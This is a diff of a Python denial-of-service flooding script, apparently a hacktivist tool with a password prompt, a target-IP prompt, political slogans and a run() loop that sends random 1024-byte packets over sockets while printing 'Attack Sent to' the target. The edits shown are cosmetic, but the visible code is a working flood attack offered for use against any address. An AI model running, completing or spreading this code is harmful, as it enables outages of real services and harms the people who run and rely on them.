@@ -43,7 +43,6 @@ print("\033[1m                                                                  
 print("\033[1m                                               \033[0m")
 print("\033[1m                                                \033[0m")
 print("\033[33m_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_\033[0m")
-      
 while attemps < 100:
     username = input('Enter your username: ')
     password = input('Enter your password: ')
@@ -55,7 +54,6 @@ while attemps < 100:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
         attemps += 1
         continue
-os.system("clear")
 
 ip = str(input("\033[93m[\033[93m+\033[92m]IP Target : "))
 print("\033[33m———————⟩⟩⟩")
@@ -76,6 +74,7 @@ print("\033[97m                  ⟩⟩  BECAUSE OF PALESTINE \033[0m "),
 time.sleep(5),
 print("\033[95m                  ⟩⟩  STILL BURNING \033[0m "),
 time.sleep(5),
+
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[+]","[-]"))
@@ -87,7 +86,7 @@ def run():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(" [💥]  \033[32m" +str(u)+ " \033[31mZ0NA R2 \033[34mAttack Sent to \033[94m" +ip+ ".")
+			print(" [💥]  \033[32m" +str(u)+ " \033[31mZ0NA R2 \033[34mAttack Sent to \033[94m" +ip+ " \033[0m")
 		except:
 			s.close()
 			print("[*] Error!!!")
